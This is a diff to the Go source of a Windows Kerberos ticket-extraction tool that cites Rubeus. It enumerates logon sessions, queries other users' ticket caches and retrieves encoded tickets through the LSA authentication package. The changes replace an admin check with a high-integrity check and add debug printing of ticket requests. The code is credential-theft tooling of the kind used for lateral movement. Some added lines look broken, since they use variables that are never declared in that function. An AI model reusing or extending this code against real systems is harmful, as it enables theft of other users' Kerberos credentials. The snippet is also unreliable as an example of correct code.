@@ -37,6 +37,13 @@ func GetLsaHandle() (windows.Handle, error) {
 		return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed: %v", err)
 	}
 
+	isSystem, _ = helpers.IsSystem()
+	if isHighIntegrity && !isSystem {
+		fmt.Printf("not system for some reason\n")
+	} else {
+		fmt.Printf("should be system\n")
+	}
+
 	return lsaHandle, nil
 }
 
@@ -59,12 +66,12 @@ func EnumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]types.Ses
 	var luids []windows.LUID
 	var sessionCreds []types.SessionCred
 
-	isAdmin, err := helpers.IsAdmin()
+	isHighIntegrity, err := helpers.IsHighIntegrity()
 	if err != nil {
 		return sessionCreds, fmt.Errorf("failed to check if admin is enabled: %v", err)
 	}
 
-	if isAdmin {
+	if isHighIntegrity {
 		luids, err = enumerateLogonSessions()
 		if err != nil {
 			return sessionCreds, fmt.Errorf("failed to enumerate logon ids: %v", err)
@@ -98,7 +105,7 @@ func EnumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]types.Ses
 		var ticketCacheRequest types.KerbQueryTktCacheRequest
 		ticketCacheRequest.MessageType = types.KerbQueryTicketCacheExMessage
 
-		if isAdmin {
+		if isHighIntegrity {
 			ticketCacheRequest.LogonId = sessionData.LogonID
 		} else {
 			// https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs#L303
@@ -107,11 +114,9 @@ func EnumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]types.Ses
 
 		var padding uint32 = 0
 
-		// Create properly sized buffer for request
 		requestSize := unsafe.Sizeof(ticketCacheRequest) + unsafe.Sizeof(padding)
 		buffer := make([]byte, requestSize)
 
-		// Copy request into buffer
 		*(*types.KerbQueryTktCacheRequest)(unsafe.Pointer(&buffer[0])) = ticketCacheRequest
 
 		ret, _, err := dll.LsaCallAuthenticationPackage.Call(
@@ -166,8 +171,6 @@ func ExtractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		return nil, fmt.Errorf("invalid LSA handle")
 	}
 
-	isAdmin, _ := helpers.IsAdmin()
-
 	targetNameUTF16 := windows.StringToUTF16(targetName)
 	nameLen := uint16(len(targetNameUTF16) * 2)
 
@@ -179,13 +182,7 @@ func ExtractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 
 	request := (*types.KerbRetrieveTktRequest)(bufferPtr)
 	request.MessageType = types.KerbRetrieveEncodedTicketMessage
-
-	if !isAdmin {
-		request.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
-	} else {
-		request.LogonId = luid
-	}
-
+	request.LogonId = luid
 	request.TicketFlags = 0
 	request.CacheOptions = 8
 	request.EncryptionType = 0
@@ -202,6 +199,8 @@ func ExtractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LU
 		MaximumLength: nameLen,
 		Buffer:        targetNamePtr,
 	}
+
+	fmt.Printf("ticket request struct: \n%+v\n", request)
 
 	var responsePtr uintptr
 	var returnLength uint32
